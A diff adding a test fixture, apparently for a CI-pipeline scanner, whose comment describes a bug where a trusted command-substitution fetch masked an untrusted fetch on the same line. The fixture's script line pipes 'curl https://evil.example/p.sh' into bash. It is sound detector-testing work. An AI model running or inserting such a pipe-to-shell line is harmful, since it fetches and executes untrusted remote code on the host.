@@ -1,0 +1,10 @@
+# violation: a trusted fetch inside a command substitution must never
+# suppress an untrusted fetch of the other kind (a plain visible-line
+# pipe) sitting on the same line. The two trust checks used to be two
+# independent OR'd bodies, each only looking at its own kind of fetch and
+# granting trust for the whole line; a trusted substitution fetch let an
+# untrusted pipe-to-shell right next to it go unreported.
+install:
+  image: alpine:3.19
+  script:
+    - bash -c "$(curl -fsSL https://get.docker.com/x.sh)"; curl https://evil.example/p.sh | bash
